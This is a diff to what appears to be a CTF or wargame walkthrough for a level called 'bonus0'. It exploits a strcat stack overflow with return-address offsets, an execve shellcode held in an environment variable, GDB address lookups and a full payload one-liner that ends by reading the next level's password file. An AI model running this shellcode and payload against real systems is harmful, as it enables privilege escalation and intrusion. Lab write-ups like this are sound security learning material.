@@ -29,33 +29,44 @@
    
    Confirms: 61 bytes written into 54-byte buffer = 7-byte overflow
 
-5. Calculate offsets and prepare shellcode:
-   Finding EIP offset using Ghidra:
+5. Find addresses and prepare exploit:
+   
+   A. Finding return address offset using Ghidra:
    - From main(): buffer[54] at ESP + 0x16, return address at ESP + 0x50
    - Offset to return address: 0x50 - 0x16 = 0x3A = 58 bytes
    - With 61 bytes written (40 + 1 + 20), return address is overwritten
-   - Testing reveals EIP is at bytes 9-12 of input 2
+   - strcat() writes starting at position 41, return address at 58
+   - Calculation: bytes 9-12 of input 2 overwrite the return address
+   
+   B. Finding shellcode address using GDB:
+   - Export SHELLCODE first:
+     export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+   
+   - Run in GDB:
+     gdb ./bonus0
+     (gdb) run
+      - 
+     AAAAAAAAAAAAAAAAAAAA
+      - 
+     BBBBBBBBBBBBBBBBBBBB
+     (gdb) x/500s $esp
+   
+   - Look for in the output:
+     0xbffffd45: "SHELLCODE=\220\220..."
+   
+   - Calculate: 0xbffffd45 + 0xa (skip "SHELLCODE=") = 0xbffffd4f
+   - Use safe address in NOP sled: 0xbffffd55
    
    Payload structure:
    - Input 1: 20 bytes (any data)
-   - Input 2: 9 bytes padding + 4 bytes (return address) + 7 bytes overflow
-   
-   Environment variable shellcode address:
-   - SHELLCODE variable location: ~0xbffffd44 (high stack, no ASLR)
-   - Skip "SHELLCODE=" prefix: +20 bytes = 0xbffffd58
-   - 200-byte NOP sled provides large landing zone
-
-6. Execute the exploit:
-   Export the shellcode as an environment variable:
-   export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
-   
-   Run the exploit:
-   (python -c 'print "A"*20'; python -c 'print "B"*9 + "\x58\xfd\xff\xbf" + "C"*7'; cat) | ./bonus0
-   
-   Note: The 'cat' command keeps stdin open for shell interaction.
+   - Input 2: 9 bytes padding + 4 bytes (0xbffffd55) + 7 bytes overflow
    
    Shellcode: 24-byte null-free execve from level2 (Exploit-DB #42428)
-   See level2 documentation for detailed shellcode analysis.
+
+6. Execute the exploit:
+   (python -c 'print "A"*20'; python -c 'print "B"*9 + "\x55\xfd\xff\xbf" + "C"*7'; cat) | ./bonus0
+   
+   Note: The 'cat' command keeps stdin open for shell interaction.
 
 7. Read the password:
    cat /home/user/bonus1/.pass
